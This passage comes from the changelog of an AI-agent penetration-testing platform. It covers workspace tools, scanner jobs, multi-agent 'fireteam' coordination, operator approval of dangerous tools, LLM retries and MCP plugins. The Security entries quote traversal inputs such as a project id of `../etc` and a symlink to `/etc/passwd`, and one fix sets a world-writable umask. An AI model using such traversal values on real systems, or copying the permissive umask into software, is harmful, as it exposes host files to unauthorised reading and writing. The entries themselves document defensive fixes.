- **24 in-process workspace tools for the agent** ([agentic/workspace_fs.py](agentic/workspace_fs.py), [agentic/prompts/tool_registry.py](agentic/prompts/tool_registry.py)) — `fs_read`, `fs_read_many`, `fs_stat`, `fs_write`, `fs_edit`, `fs_multi_edit`, `fs_undo_edit`, `fs_delete`, `fs_move`, `fs_copy`, `fs_mkdir`, `fs_chmod`, `fs_symlink_create`, `fs_grep` (ripgrep wrapper), `fs_glob`, `fs_find`, `fs_list`, `fs_tree`, `fs_symbols` (tree-sitter AST for 15 languages), `fs_symlink_read`, `fs_hash`, `fs_diff` (incl. `vs_last_read` snapshot mode for stale-read detection), `fs_extract` (zip-slip + tar-slip safe), `fs_archive`. Atomic writes via tmp+rename; per-file undo stack capped at 20.

- **5 background-job tools** ([agentic/job_runner.py](agentic/job_runner.py)) — `job_spawn`, `job_status`, `job_wait`, `job_cancel`, `job_list`. Long-running scans (nuclei, hydra) detach as asyncio tasks and stream output to `jobs/<id>.log` so `fs_grep` works mid-flight. State survives agent restart: orphan `running` jobs flip to `interrupted` via `recover_on_boot` at lifespan startup.

- **Tool-output auto-offload** ([agentic/output_offload.py](agentic/output_offload.py), [agentic/tool_offload_policy.py](agentic/tool_offload_policy.py)) — outputs over 20KB get written to `tool-outputs/<utc-iso>-<tool>.txt` automatically and the LLM receives a head/tail stub with the file path. Per-tool policy map (`never`/`always`/`auto`) + per-call `output_mode` override (`inline`/`file`/`auto`). Char-capped head/tail (4KB/2KB) so single-line blobs (base64, minified JSON) don't defeat the offload.

- **Workspace HTTP API** ([agentic/api.py](agentic/api.py), [webapp/src/app/api/agent/workspace/](webapp/src/app/api/agent/workspace/)) — 13 endpoints powering the drawer: `list`, `tree`, `download`, `upload` (multipart with 409-on-collision), `mkdir`, `rename`, `delete`, `archive-download` (folder → tar.gz), `bulk-archive` (N selected → one tar.gz), `preview`, `properties`, `jobs`, `jobs/<id>/cancel`. All proxied through the existing cookie-auth webapp middleware.

- **FileSystemDrawer in the graph view** ([webapp/src/app/graph/components/FileSystemDrawer/](webapp/src/app/graph/components/FileSystemDrawer/), [webapp/src/app/graph/page.tsx](webapp/src/app/graph/page.tsx), [webapp/src/app/graph/components/GraphToolbar/GraphToolbar.tsx](webapp/src/app/graph/components/GraphToolbar/GraphToolbar.tsx), [webapp/src/app/graph/components/AIAssistantDrawer/DrawerHeader.tsx](webapp/src/app/graph/components/AIAssistantDrawer/DrawerHeader.tsx)) — left-side drawer with **Files** tab (breadcrumb navigation, sort by name/size/modified, filter box, multi-select with bulk download/delete, drag-and-drop upload with overwrite confirmation, inline file preview with text + binary-safe fallback, properties popover showing SHA-256 + mode + mtime + symlink target, per-folder download as `.tar.gz`) and **Jobs** tab (live status badges, log view, cancel). Auto-refreshes every 5s while open (paused during preview). Two entry points: folder icon in the graph toolbar and folder icon in the AI drawer header — opening either closes the NodeDrawer first.

- **Protected default subdirs** ([agentic/workspace_fs.py](agentic/workspace_fs.py)) — `notes/`, `tool-outputs/`, `jobs/`, `uploads/` cannot be renamed or deleted from the drawer (frontend Lock badge + backend enforcement at `delete_for_project` / `rename_for_project`). Files INSIDE them remain fully editable. Bulk delete with mixed selection silently skips protected entries and explains in the confirm modal.

- **`WORKSPACE_LAYOUT_BLOCK` prepended to every think-step prompt** ([agentic/prompts/base.py](agentic/prompts/base.py), [agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — teaches the agent which folder is for what (`notes/` = scratch, `tool-outputs/` + `jobs/` = auto-managed read-only, `uploads/` = user inbox). The `uploads/` section only renders when files are present, with a `CHECK THESE NOW` directive listing each staged filename (newest first, capped at 20) so the agent reflexively reads what the user dropped.

- **WebSocket `job_update` events** ([agentic/ws_job_emitter.py](agentic/ws_job_emitter.py), [agentic/websocket_api.py](agentic/websocket_api.py)) — JobRegistry pushes lifecycle transitions through the existing chat WS so the drawer's Jobs tab updates instantly instead of waiting for the 5s poll fallback. Per-project fan-out, send-failure tolerant.

### Fixed

- **Workspace tools were invisible to the LLM** ([agentic/project_settings.py](agentic/project_settings.py)) — `get_allowed_tools_for_phase()` only returned `TOOL_PHASE_MAP` keys and MCP-manifest tools, so the 24 `fs_*` and 5 `job_*` tools never made it into the agent's available-tools enum. Agent fell back to `kali_shell "mkdir -p /workspace/foo"` (project-unscoped, polluted the bind-mount root). Added foundational-tool bypass mirroring the existing `is_tool_allowed_in_phase` pattern + 3 regression tests.

- **Webapp test suite project-wide non-functional** ([webapp/vitest.config.ts](webapp/vitest.config.ts), [webapp/vitest.setup.ts](webapp/vitest.setup.ts)) — webapp container had `NODE_ENV=production` baked in, so React 19's `act` (test-only API) was stripped from the prod bundle. Every `render()`-based test failed at module load with `TypeError: React.act is not a function`. Set `NODE_ENV=test` in vitest config + registered `@testing-library/jest-dom` matchers via setup file — unblocks ~1700 component tests project-wide.

- **Stale preview / properties on drawer reopen and project switch** ([webapp/src/app/graph/components/FileSystemDrawer/FileSystemDrawer.tsx](webapp/src/app/graph/components/FileSystemDrawer/FileSystemDrawer.tsx)) — the reset `useEffect` only reset `currentPath` and `tab`, leaving `previewing` and `propertiesFor` set. Closing + reopening the drawer (or switching projects) showed the previous file's preview or a SHA-256 from a different project. Added preview/properties/selection/filter clears + `projectId` to the deps array.

### Security

- **Project-id injection via HTTP query string** ([agentic/workspace_fs.py](agentic/workspace_fs.py)) — `projectId="../etc"` made `WORKSPACE_ROOT / projectId` resolve to the workspace's parent directory; every subsequent path check then treated that escaped location as the project root, letting an authenticated caller read/write arbitrary host paths the agent had access to. New `_validate_project_id()` rejects `/`, `\`, null byte, leading `.`, or `..`. Verified live: traversal probes return clean 400s; UUID project-ids still work.

- **Protected-subdir bypass via path normalization** ([agentic/workspace_fs.py](agentic/workspace_fs.py)) — `./notes`, `notes/`, `notes//`, `./` all bypassed `is_protected_path()` because the naive `.split("/")` check ran without normalization. A caller sending `path=./notes` to DELETE could wipe a protected default subdir. Normalizes with `os.path.normpath` first; 11 variants regression-pinned.

- **ZIP archive leaked symlink-target content** ([agentic/workspace_fs.py](agentic/workspace_fs.py)) — `zipfile.write(symlink)` follows the symlink at OS level and stores the target's content under the symlink's name. A workspace symlink to `/etc/passwd` would have been served inline in the downloaded `.zip` via `archive-download` or `bulk-archive`. Skip symlinks in both `archive_dir_for_project` and `bulk_archive_for_project` (tar.gz and zip paths).

- **Workspace files were unwritable from the host** ([agentic/api.py](agentic/api.py)) — agent container runs as root, so files it created in the bind-mount ended up `root:root` mode 644/755; host user (UID 1000) couldn't `rm` or edit workspace files. `os.umask(0)` at agent lifespan startup so new files get 0o666 / dirs 0o777. Verified via `/proc/1/status` on the live container.

- **`fs_copy` preserved restrictive source modes** ([agentic/workspace_fs.py](agentic/workspace_fs.py)) — `shutil.copy2` copies file metadata including permissions; a source at 0o600 produced a 0o600 copy, defeating the umask intent and locking the host user out of the copy. Explicit `os.chmod` after `copy2` + recursive normalization helper for `copytree` (dirs → 0o777, files → 0o666).

- **Download anchor navigated the page on server error** ([webapp/src/app/graph/components/FileSystemDrawer/FileSystemDrawer.tsx](webapp/src/app/graph/components/FileSystemDrawer/FileSystemDrawer.tsx)) — `window.location.href = url` would navigate away from the graph view (losing session state) if the backend returned a JSON error response. Replaced with an anchor element using the `download` attribute — happy path triggers the browser download dialog, errors save the JSON as a file but never navigate.


---


## [4.9.3] - 2026-05-12

### Added

- **Fireteam peer-task awareness** ([agentic/state.py](agentic/state.py), [agentic/orchestrator_helpers/nodes/fireteam_deploy_node.py](agentic/orchestrator_helpers/nodes/fireteam_deploy_node.py), [agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py](agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py), [agentic/tests/test_peer_task_scope.py](agentic/tests/test_peer_task_scope.py)) — each member now receives a `## Sibling members in this wave (OUT OF SCOPE for you)` block listing what every other member is covering, rendered immediately after the mission so it weights heavily in instruction-following. Eliminates scope creep where Member A, having exhausted its surface, would pivot into Member B's territory (observed in pre-fix sessions where Member 2 / CI-CD probed ports owned by Member 4 / IP-direct). New `_peer_tasks` TypedDict field declared on `FireteamMemberState`, populated by `_build_member_state` from the plan minus self, snapshot-isolated from later plan mutations. 31 tests in `test_peer_task_scope.py` cover self-exclusion, 240-char task truncation, missing fields, deep-copy semantics, brace safety in `.format()`, unicode, duplicate-name degradation, and full-pipeline rendering on a 5-member wave.

- **Soft tool allowlist with friction-based fallback** ([agentic/state.py](agentic/state.py), [agentic/prompts/__init__.py](agentic/prompts/__init__.py), [agentic/prompts/base.py](agentic/prompts/base.py), [agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py](agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py), [agentic/tests/test_soft_allowlist.py](agentic/tests/test_soft_allowlist.py)) — each member's prompt now splits the tool registry into `## Primary tools (your assigned toolbox)` (full descriptions, filtered to declared `tools` + `query_graph`) and `## Fallback toolbox` (compact name+purpose only, everything else). Calling a fallback tool requires a new `tool_expansion_reason` field on the decision JSON; the semantic gate in the parse loop re-prompts once if missing, branching the retry-prep wrapper on `last_error_kind` so semantic errors aren't mislabeled as "JSON failed validation". A graduated budget warning (`## Tool expansion budget` at 2+ fallback uses, `## Recommendation: complete` at 4+ uses with 2+ stalled iterations) nudges flailing members to complete and let the root re-deploy. `fallback_uses_this_run`, `iterations_since_new_finding`, `last_findings_count` TypedDict fields wire it up. Companion fixes: `build_tool_availability_table` suppresses the "Current phase allows" line when a `tool_filter` is active (it would otherwise lie about what's reachable); kali_shell install rules render whenever the phase allows kali_shell, independent of whether the member declared it; iter-1 stall counter no longer ticks before any tool has executed. 45 tests in `test_soft_allowlist.py` + 12 bug-fix regression guards.

- **Canonical `tools` field with strict planner contract** ([agentic/state.py](agentic/state.py), [agentic/prompts/base.py](agentic/prompts/base.py), [agentic/orchestrator_helpers/nodes/fireteam_deploy_node.py](agentic/orchestrator_helpers/nodes/fireteam_deploy_node.py), [agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py](agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py), [webapp/prisma/schema.prisma](webapp/prisma/schema.prisma), [webapp/src/app/api/conversations/by-session/[sessionId]/fireteams/route.ts](webapp/src/app/api/conversations/by-session/[sessionId]/fireteams/route.ts), [webapp/src/app/graph/components/AIAssistantDrawer/hooks/fireteamChatState.ts](webapp/src/app/graph/components/AIAssistantDrawer/hooks/fireteamChatState.ts), [webapp/src/lib/websocket-types.ts](webapp/src/lib/websocket-types.ts)) — renamed `FireteamMemberSpec.skills` → `tools` and `LLMDecision.skill_expansion_reason` → `tool_expansion_reason`, with no legacy alias on the Pydantic models so planner outputs emitting the old key fail validation immediately and the LLM relearns the canonical convention. The `_FIRETEAM_PROMPT_BLOCK` planner prompt now carries an explicit "`tools` MUST be canonical tool names" contract with RIGHT/WRONG examples (`["execute_httpx", "execute_curl"]` not `["httpx", "curl"]`) — eliminates the short-form rot that was forcing the semantic gate to fire on every legitimate primary call. DB column kept as `skills` (the webapp's `member.tools` already means executed tool calls — different concept); the webapp bridges `m.tools ?? m.skills` at the API and WebSocket boundaries. Default `FIRETEAM_MEMBER_MAX_ITERATIONS` lowered 20 → 10 to force tighter wave-boundary re-coordination (productive work concentrates in iterations 1-4; iterations past 6 typically loop). Pinned by 57 tests in `test_soft_allowlist.py` plus mechanical updates across 7 fireteam test files.


---


## [4.9.2] - 2026-05-11

### Fixed

- **Fireteam wave-timeout left members stuck at `status=running`** ([agentic/orchestrator_helpers/nodes/fireteam_deploy_node.py](agentic/orchestrator_helpers/nodes/fireteam_deploy_node.py), [agentic/tests/test_fireteam_regressions.py](agentic/tests/test_fireteam_regressions.py)) -- when `FIRETEAM_TIMEOUT_SEC` expired, the outer handler called `t.cancel()` on every outstanding member, but `_run_one`'s `except asyncio.CancelledError: raise` re-raised before the per-member `_patch_member` (DB) and `on_fireteam_member_completed` (WebSocket) calls inside it could run. `fireteam_members` rows stayed at `status=running, completedAt=NULL` forever and on session restore the UI showed cancelled specialists as still spinning. PR [#112](https://github.com/samugit83/redamon/pull/112) added a patch in the cancel handler but missed iteration/token counts, sent a dead `completedAt` field the API route ignored, hardcoded `"timeout"` even for operator-stops, and didn't fix the WS gap. Moved both persistence and WS emission into the outer `TimeoutError` handler iterating the already-populated `results` list (mirrors the operator-cancel branch's pattern), so real iteration/token/findings/wallclock values land in Postgres and the live UI flips member cards to `timeout` without a refresh. `_run_one`'s `except CancelledError` is now log-and-raise only. Pinned by 4 regression tests in `WaveTimeoutDbPersistRegression` + `WaveTimeoutWebsocketEmitRegression` that fail against pre-PR-112 master and against the PR #112 partial fix.

- **Ghost RUNNING tool cards on fireteam member panels after dangerous-tool escalation** ([agentic/orchestrator_helpers/streaming.py](agentic/orchestrator_helpers/streaming.py), [agentic/tests/test_tool_complete_emission.py](agentic/tests/test_tool_complete_emission.py)) — when a fireteam member's `think_node` decided to use a dangerous tool (kali_shell / execute_curl / execute_nuclei / etc.), the member set both `_current_step` and `_pending_confirmation` on its state update. The tool_start gate at [streaming.py:206](agentic/orchestrator_helpers/streaming.py#L206) only guarded against `awaiting_tool_confirmation` (the root-agent flag) and did NOT check `_pending_confirmation` (the fireteam-MEMBER flag), so it emitted `FIRETEAM_TOOL_START` BEFORE the operator had any chance to approve. The UI rendered a RUNNING tool card; on operator approval [process_fireteam_confirmation_node](agentic/orchestrator_helpers/nodes/process_fireteam_confirmation_node.py) redeployed the tool inside a NEW single-member fireteam whose `TOOL_COMPLETE` events carry a different `member_id` than the original member, so the original RUNNING card never matched a completion and stayed stuck. Compounded by the on_tool_complete gate at the same file requiring `output_analysis` to be truthy (empty-output tools, status-000 curls, "no live hosts found" httpx all left their cards stuck), and a content-based dedup ID (`tc|<tool>|<analysis>`) that collided across consecutive identical empty outputs. Three changes: (1) added `not state.get("_pending_confirmation")` to the tool_start gate, (2) dropped the `output_analysis` truthy requirement from the tool_complete gate, (3) switched the dedup ID to `tc|<step_id>` (uuid4-based, unique per step) with fallback to content for legacy state shapes. Robustness: handled `None` output_analysis in the slice (was raising TypeError caught silently by the outer except). Pinned by 22 tests in `test_tool_complete_emission.py`: 4 bug reproductions (empty output, None output, curl status-000, two consecutive empty failures), 5 gate unit tests (presence checks), 5 dedup regression tests, 3 multi-iteration smoke tests, 5 pending-confirmation guard tests covering both flags independently and together.

- **Fireteam member timeline rendered waves above older standalone tools regardless of timestamp** ([webapp/src/app/graph/components/AIAssistantDrawer/FireteamMemberCard.tsx](webapp/src/app/graph/components/AIAssistantDrawer/FireteamMemberCard.tsx), [FireteamMemberCard.module.css](webapp/src/app/graph/components/AIAssistantDrawer/FireteamMemberCard.module.css), [FireteamMemberCardTimelineOrder.test.tsx](webapp/src/app/graph/components/AIAssistantDrawer/FireteamMemberCardTimelineOrder.test.tsx)) — `FireteamMemberPanel` carries two parallel arrays (`planWaves` and `tools`) populated independently by the WS handlers; the component rendered them in fixed JSX order (all waves first, then all standalone tools), so a plan wave created LATER than a standalone tool appeared ABOVE the older tool, breaking the operator's chronological mental model. Merged both arrays into a single timestamp-sorted timeline so the panel reads top-to-bottom in execution order. Pinned by 6 tests in `FireteamMemberCardTimelineOrder.test.tsx` covering: wave-after-tool ordering, tool-after-wave (mirror), 3-item mixed sequence, tools-only / waves-only / empty edge cases.

- **Fireteam member Allow/Deny buttons permanently disabled** ([webapp/src/app/graph/components/AIAssistantDrawer/ChatArea.tsx](webapp/src/app/graph/components/AIAssistantDrawer/ChatArea.tsx), [AgentTimeline.tsx](webapp/src/app/graph/components/AIAssistantDrawer/AgentTimeline.tsx), [FireteamCard.tsx](webapp/src/app/graph/components/AIAssistantDrawer/FireteamCard.tsx), [FireteamMemberCard.tsx](webapp/src/app/graph/components/AIAssistantDrawer/FireteamMemberCard.tsx), [PlanWaveCard.tsx](webapp/src/app/graph/components/AIAssistantDrawer/PlanWaveCard.tsx), [ToolExecutionCard.tsx](webapp/src/app/graph/components/AIAssistantDrawer/ToolExecutionCard.tsx), [FireteamApprovalButtons.test.tsx](webapp/src/app/graph/components/AIAssistantDrawer/FireteamApprovalButtons.test.tsx)) — in fireteam mode the per-member approval card's Allow/Deny buttons stayed disabled forever, so an operator could not approve a single member's escalated tool while the other N-1 members were still streaming. Root cause: `toolConfirmationDisabled` was prop-drilled from ChatArea bound to the global `isLoading` flag through 5 components. In single-agent mode the `TOOL_CONFIRMATION_REQUEST` WS handler flips `isLoading=false` (so the buttons enable correctly), but the dedicated `FIRETEAM_MEMBER_AWAITING_CONFIRMATION` handler deliberately does NOT touch `isLoading` ([useWebSocketHandler.ts:710-712](webapp/src/app/graph/components/AIAssistantDrawer/hooks/useWebSocketHandler.ts#L710) — other members keep running in parallel by design), so `isLoading` stayed `true` and the buttons stayed disabled. Closed PR [#106](https://github.com/samugit83/redamon/pull/106) as the more surgical fix: rather than hard-coding `disabled={false}` on the buttons, removed the entire `toolConfirmationDisabled` / `confirmationDisabled` prop chain — the existing `status === 'pending_approval' ? handler : undefined` gate at every parent already prevents the buttons from rendering for non-pending states. Net -3874 lines because the stale `AIAssistantDrawer copy.tsx` backup (177 KB of orphaned monolith referencing the now-removed prop) was deleted at the same time. Pinned by 10 new regression tests in `FireteamApprovalButtons.test.tsx` covering both `PlanWaveCard` (used inside fireteam member panels) and `ToolExecutionCard` (single-agent path): Allow/Deny render with `disabled={false}` when status is pending_approval, fire onApprove/onReject with stopPropagation, and do NOT render when status is `running` or `onApprove` is absent.

- **Companion TypeScript cleanup** (test fixtures + Prisma client regen) — ride-along during the fireteam fix: webapp typecheck went from 65+ errors to 0. Three root causes resolved: **(1)** the MCP-user-managed-servers feature (commit `e023010`) added a `mcpServers Json` column to `UserSettings` in the Prisma schema, but the generated TS client was never regenerated, so 16 errors in 4 API routes (`api/mcp/test/route.ts`, `api/projects/[id]/route.ts`, `api/users/[id]/mcp/route.ts`, `api/users/[id]/mcp/[serverId]/route.ts`) thought `mcpServers` didn't exist — `prisma generate` fixed all 16; **(2)** 12 test-fixture drifts after upstream type refactors: `useChatState.test.ts` fixtures missing required fields on `ThinkingItem` (`reasoning`, `action`, `updated_todo_list`) and `DeepThinkItem` (renamed `thought` → `trigger_reason`/`analysis`/`iteration`/`phase`) and `FileDownloadItem.timestamp`; `NodeDetailsTable.test.tsx` 7 fixtures missing `projectId` after `GraphData` made it required; `reportTemplate.test.ts` missing the entire `vhostSni` block after the section was added to `ReportData`; `recon-preset-schema.test.ts` needed `/// <reference types="vite/client" />` for `import.meta.glob`; **(3)** unused `@ts-expect-error - jsdom global` in `useUserPreferences.test.tsx` after jsdom typings improved. Build cache `.next/` was also cleaned of orphaned validator references to a deleted `check-conflict` route. 17 unrelated pre-existing test failures (workflow layout, plan-status derivation edge case, API keys template count drift, Neo4j Int64 serialization, fireteam section report rendering) left in place — confirmed pre-existing via stashed-changes rerun, out of scope for this fix.

- **MCP nuclei URL fell back to host gateway** ([docker-compose.yml](docker-compose.yml)) — PR [#108](https://github.com/samugit83/redamon/pull/108) added the missing `MCP_NUCLEI_URL: http://kali-sandbox:8002/sse` env var on the agent service. Without it [agentic/tools.py:117](agentic/tools.py#L117) defaulted to `host.docker.internal:8002/sse`, which fails on deployments where the kali-sandbox port isn't published on the host or `host.docker.internal` doesn't resolve via the gateway. The blast radius was wide because `langchain_mcp_adapters.MultiServerMCPClient.get_tools()` calls `asyncio.gather(*tasks)` **without** `return_exceptions=True`, so a single bad MCP URL aborts the entire gather and the agent loses ALL MCP tools (curl, naabu, nmap, metasploit, playwright) — manifesting as `Tool not found` errors on tools unrelated to nuclei. Also aligned the env var with the existing `MCP_NETWORK_RECON_URL`/`MCP_NMAP_URL`/`MCP_METASPLOIT_URL`/`MCP_PLAYWRIGHT_URL` pattern.

- **Guardrail fail-closed RuntimeError dropped the upstream cause** ([agentic/orchestrator_helpers/guardrail.py](agentic/orchestrator_helpers/guardrail.py), [agentic/tests/test_root_think_and_guardrail_retry.py](agentic/tests/test_root_think_and_guardrail_retry.py)) — after 3 transient failures the exhaustion path raised a bare `RuntimeError("Guardrail LLM check failed after 3 attempts")` with `__cause__ = None`, so an upstream Anthropic 529 / network blip looked identical in the UI to a scope or auth problem and sent operators chasing the wrong diagnostic. Closed PR [#107](https://github.com/samugit83/redamon/pull/107) as stale (its non-transient half had already been solved by 6102cd2 and the diff no longer applied) and applied the residual fix directly: capture `last_transient` only inside the transient branch, chain it via `raise ... from last_transient` and surface its `str()` in the RuntimeError message. Parse-only exhaustion (3 successful LLM calls but no JSON) gets a distinct `"...(no parseable JSON in any response)"` message with `__cause__` kept `None` rather than fabricating a fake cause. Three new regression tests in `tests.test_root_think_and_guardrail_retry`: chained-cause on all-transient, no-cause on all-parse-failures, last-transient chained when mixed transient + final no-JSON.

- **SDK-level retry/timeout on `ChatAnthropic` clients** ([agentic/orchestrator_helpers/llm_setup.py](agentic/orchestrator_helpers/llm_setup.py)) — PR [#109](https://github.com/samugit83/redamon/pull/109) set `max_retries=5` and `default_request_timeout=300.0` on both Anthropic constructors so transient blips are absorbed inside the SDK before the Python-level `retry_llm_call` wrapper even fires (defense-in-depth) and unwrapped call sites (`api.py`, `tools.py`, cypherfix) get protection too. Post-merge optimization: dropped the dead `default_request_timeout=300.0` from the custom-provider path because `langchain_anthropic` exposes it as an alias of the pre-existing `timeout` kwarg there — with `populate_by_name=True` Pydantic silently let the user-configured `timeout` win, so the 300s line was misleading dead code. Built-in anthropic path keeps both kwargs (no conflict, no pre-existing `timeout`).

- **Transient LLM errors terminated long-running orchestration work in three places** ([agentic/orchestrator_helpers/llm_retry.py](agentic/orchestrator_helpers/llm_retry.py), [agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py](agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py), [agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py), [agentic/orchestrator_helpers/guardrail.py](agentic/orchestrator_helpers/guardrail.py)) -- a single transient LLM exception (network blip, HTTP 529 overload, rate-limit, 5xx) could kill an entire fireteam member, an entire session (root think node), or surface a misleading "failed after 3 attempts" RuntimeError instead of the real cause (guardrail). PR [#111](https://github.com/samugit83/redamon/pull/111) added a 3-attempt retry around the fireteam member's `await llm.ainvoke`, but the substring-only classifier had two bugs: (a) bare numeric codes `500`/`502`/`503`/`504`/`529` were matched as substrings, false-positive on messages like `max_tokens: 50000 exceeded` (a permanent token-limit error was retried 3x for 14s of wasted latency before still failing); (b) the loop slept `min(2**2, 8)=4s` after the FINAL attempt with no further retry to perform. Extracted the classifier + retry loop into a shared `orchestrator_helpers/llm_retry.py` with two improvements: type-MRO walk against known SDK exception class names (catches `anthropic.InternalServerError` etc. even when the message has no transient keyword) and word-boundary regex on bare status codes (`\b(429|500|502|503|504|529)\b`) so `500` no longer matches `50000`. Applied the helper to **(1)** the fireteam member (refactor, net -23 lines, identical behavior), **(2)** the root `think_node` -- previously called `await llm.ainvoke(messages)` with NO try/except, so a transient there crashed the entire session strictly worse than the fireteam bug; now wrapped in `retry_llm_call` with a fallback `LLMDecision(action=complete, completion_reason=llm_error: <exc>)` on exhaustion so the graph exits cleanly, **(3)** `guardrail._invoke_guardrail` -- previously had broad `except Exception` that retried EVERY error (auth, schema, model-not-found) 3x and burned budget before raising a generic RuntimeError; now permanent errors re-raise immediately with the original exception, transient errors retry with exponential backoff, and the empty-JSON parse-retry path is preserved. Pinned by 56 new tests across `tests/test_llm_retry.py` (10 direct unit tests of `retry_llm_call`), `tests/test_fireteam_member_llm_retry.py` (37 tests: classifier unit + retry-loop integration + bug-guard regressions for `max_tokens 50000` false-positive and wasted-final-sleep), and `tests/test_root_think_and_guardrail_retry.py` (9 tests: think_node wiring via source inspection + end-to-end guardrail selective-retry regressions including the non-transient-must-not-retry regression).


---


## [4.9.1] - 2026-05-10

### Fixed

- **Partial-recon Katana never crawled** ([recon/helpers/resource_enum/katana_helpers.py](recon/helpers/resource_enum/katana_helpers.py)) — Docker-in-Docker path mismatch: targets file written to recon container's `/tmp/`, but spawned katana's `-v /tmp:/tmp` resolved against the host daemon's `/tmp` (where the file didn't exist), so katana exited in ~1.5s with 0 URLs. Switched to `/tmp/redamon/` (already host-shared, used by every other tool) and surface stderr on early exit.
- **Partial-recon ignored "Include Root Domain" scope** ([recon/partial_recon_modules/graph_builders.py](recon/partial_recon_modules/graph_builders.py), [recon/helpers/target_helpers.py](recon/helpers/target_helpers.py)) — 9 tools (Katana, Hakrawler, FFuf, Kiterunner, Naabu, Masscan, Nmap, Httpx, Nuclei + security checks) wrote apex BaseURL/Endpoint nodes regardless of the project's `subdomainList` toggle. Added `_should_include_root_domain(settings)` mirroring `recon/main.py:parse_target`; graph builders gate the apex `Domain → IP` query, filter apex BaseURLs from Source 2, and stamp `metadata.include_root_domain` so `extract_targets_from_recon` excludes the apex hostname when scope says no. Same scope contract as the full pipeline.
- **Resource-enum orphan-linker** ([graph_db/mixins/recon/resource_mixin.py](graph_db/mixins/recon/resource_mixin.py)) — replaced substring `bu.url CONTAINS sub.name` (cross-Subdomain mis-link trap) with exact host extraction and added an apex/Domain pass so bare-domain BaseURLs link to the Domain node instead of being orphaned.
- **`execute_playwright` async-API regression loop** ([agentic/prompts/tool_registry.py](agentic/prompts/tool_registry.py), [mcp/servers/playwright_server.py](mcp/servers/playwright_server.py)) — agent kept writing `await` / `asyncio.run()` inside scripts (sync-only wrapper), burning 6+ iterations on `SyntaxError` / `RuntimeError`. Added explicit "Sync API only" rule to the tool description and a pre-flight guard that returns an actionable error naming the forbidden token.


---


## [4.9.0] - 2026-05-09

### Added — MCP Tool Plugins (Global Settings → MCP Tool Plugins tab)

Plug **any Model-Context-Protocol server** into the agent as a *tool plugin* — Shodan, GitHub, Censys, Hugging Face, mitmproxy, Burp Suite, your own internal MCPs — without editing code, rebuilding containers, or running database migrations. The product term **MCP Tool Plugin** disambiguates these from the 5 baseline system MCP servers shipped in kali-sandbox. Tools auto-inject into the agent's system prompt within ~1 second of save and surface in every project's Tool Matrix with phase toggles. Three transports supported: `stdio`, `sse`, `streamable_http`.

#### Webapp UI

- **New "MCP Tool Plugins" tab** in Global Settings ([webapp/src/app/settings/page.tsx](webapp/src/app/settings/page.tsx), [webapp/src/components/settings/mcp/](webapp/src/components/settings/mcp/)) — list view, add/edit form, delete with themed confirmation modal (no native browser dialogs), enable toggle, transport pill, tool count
- **39 prefilled Quick Add presets** ([webapp/src/lib/mcp/presets.ts](webapp/src/lib/mcp/presets.ts)) covering OSINT (Shodan, VirusTotal, Censys, Hunter.io, HIBP, OSINT Toolkit with 37 tools, Brave/Tavily/Exa/DuckDuckGo search), security (Semgrep SAST, Snyk, OWASP ZAP, Trivy, CVE Intel with NVD+EPSS+KEV+ATT&CK, Threat Intel bundle), cloud (AWS, Kubernetes, Prowler), web (Puppeteer, Browserbase, mitmproxy), utility (Notion, Slack, Linear, Memory, Sequential Thinking, Filesystem), reverse-engineering (Ghidra), reporting / payments (Stripe). Click → form opens prefilled with everything except the secret. Vertical scroll, max 360px
- **"Discover and add new tools" button** (orange, top of form) — runs a one-off MCP `list_tools()` against the draft, returns within 30s, auto-imports into a scrollable table (sticky header, 320px cap). Per-row "+ Add" or one-click "+ add all". Auto-fills all 5 LLM-bound fields including `args_format` derived from each tool's JSON Schema (types, enums, defaults, min/max, format hints, per-property descriptions)
- **"Add Tool Manually" button** — alternative to discovery, repositioned to the *Tools (n)* header for visibility
- **`→ injected in LLM prompt` badges** next to every LLM-bound field (name / purpose / when_to_use / args_format / description) with hover tooltips explaining which prompt section each lands in
- **Bearer-token field** with eye-toggle visibility, password input by default, masked on display (`••••••••<last4>`), preserves the literal on edits when the user doesn't touch it. Token is stored as plaintext in the DB and sent verbatim as `Authorization: Bearer <token>` to the upstream MCP — no string substitution
- **Project Tool Matrix integration** ([webapp/src/components/projects/ProjectForm/sections/ToolMatrixSection.tsx](webapp/src/components/projects/ProjectForm/sections/ToolMatrixSection.tsx)) — installed plugins auto-appear under a separate "MCP Tool Plugins" header below the built-ins, grouped by server in `<details>` blocks; each tool gets the same 3-phase checkboxes; defaults to all phases enabled at read time (no DB pollution)
- **Wrench-icon tooltip in agent chat** ([webapp/src/app/graph/components/AIAssistantDrawer/PhaseIndicatorBar.tsx](webapp/src/app/graph/components/AIAssistantDrawer/PhaseIndicatorBar.tsx)) — now lists installed plugin tools in a separate "MCP Tool Plugins" subsection. Interactive tooltip (300px scroll cap) — mouse can move onto the tooltip body to scroll without the popup closing. Reusable `interactive` prop added to the shared [Tooltip](webapp/src/components/ui/Tooltip/Tooltip.tsx) component (default `false` so all other tooltips keep legacy hover-and-leave behavior)

#### Webapp backend (API + storage)

- **New routes**: `/api/users/[id]/mcp` (GET / POST), `/api/users/[id]/mcp/[serverId]` (PUT / DELETE), `/api/mcp/test` (proxy with masked-token restoration), `/api/mcp/manifest` (proxy), `/api/mcp/reload` (proxy)
- **Shared zod schema** ([webapp/src/lib/mcp/schema.ts](webapp/src/lib/mcp/schema.ts)) — single source of truth for client-side form validation + server-side API validation. Mirrors the agent's pydantic schema (parity sentinels in tests guard against drift)
- **`UserSettings.mcpServers Json` column** ([webapp/prisma/schema.prisma](webapp/prisma/schema.prisma)) — JSON-flexible, no future migrations needed for shape evolution
- **Token masking + preserve-on-update** — same pattern already used for Tavily/Shodan/SerpAPI keys: tokens are masked on read, restored from DB when the user submits the masked placeholder back
- **Fire-and-forget reload** — every save/delete pings agent's `/mcp/reload` automatically so the running agent picks up changes without restart

#### Agent

